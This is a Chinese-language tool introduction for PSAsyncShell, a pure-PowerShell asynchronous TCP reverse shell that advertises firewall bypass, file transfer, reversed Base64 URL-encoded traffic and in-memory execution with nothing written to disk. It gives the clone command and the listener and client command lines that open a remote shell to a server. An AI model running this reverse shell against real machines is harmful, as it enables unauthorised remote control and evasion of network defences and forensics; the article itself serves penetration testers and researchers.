![](https://image.3001.net/images/20220927/1664282378_6332ef0ab6994e018c1f1.png!small)

## 关于PSAsyncShell

PSAsyncShell是一款功能强大的PowerShell异步TCP反向Shell，该工具基于纯PowerShell开发，适用于安装并配置了PowerShell环境的设备使用。和其他反向Shell工具不同的是，该工具所实现的所有通信和执行流都是异步完成的，并实现了一些针对防火墙绕过和远程连接处理对策。

除此之外，该工具还提供了命令历史记录、屏幕清理、文件上传和下载、信息分块和反向Base64 URL编码流量等功能。

## 工具要求

> PowerShell v4.0或更高版本

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/JoelGMSec/PSAsyncShell.git

## 工具使用

![](https://image.3001.net/images/20220927/1664282404_6332ef24de52e05b09fa2.png!small)

正如我们在上图中看到的，该工具的使用非常简单，我们只需要让服务器部分监听并使用相应的目标 IP 和端口，然后与目标设备建立连接即可。

### 命令解释

监听来自客户端新传入的链接：

    
    
    .\PSAsyncShell.ps1 -s -p listen_port

将客户端链接到一台PSAsyncShell服务器：

    
    
    .\PSAsyncShell.ps1 -c server_ip server_port

## 工具使用样例

在下面的例子中，我们开启了一个Windows的反向Shell，并使用Linux设备作为服务器：

![](https://image.3001.net/images/20220927/1664282432_6332ef403d26a8425c14f.png!small)

一切的操作都是异步完成的，也就是说，每次执行命令时，都会进行以下操作：

> 1、服务器从提示符读取命令并将其存储在变量中；
>
> 2、服务器侦听端口并准备发送；
>
> 3、客户端连接，接收命令，双方关闭连接；
>
> 4、客户端执行命令并保存变量中的结果；
>
> 5、服务器再次侦听端口，接收输出；
>
> 6、客户端再次连接并将命令的输出发送到服务器；
>
> 7、服务器接收它，解码并通过屏幕显示；
>
> 8、双方各自关闭连接；

![](https://image.3001.net/images/20220927/1664282441_6332ef49df9afef01ade9.png!small)

其中，所有流量都通过 Base64 URL 反向编码，信息的执行和发送总是从内存中完成，并且任何时候都不会在磁盘上写入任何内容。

## 许可证协议

本项目的开发与发布遵循[ _GPL_
_-3.0_](https://github.com/JoelGMSec/PSAsyncShell/blob/main/LICENSE)开源许可证协议。

## 项目地址

 **PSAsyncShell** ：【[ _GitHub传送门_](https://github.com/JoelGMSec/PSAsyncShell)】

## 参考资料

> [ _https://darkbyte.net/psasyncshell-bypasseando-firewalls-con-una-shell-> tcp-asincrona/﻿_](https://darkbyte.net/psasyncshell-bypasseando-firewalls-> con-una-shell-tcp-asincrona/)

  

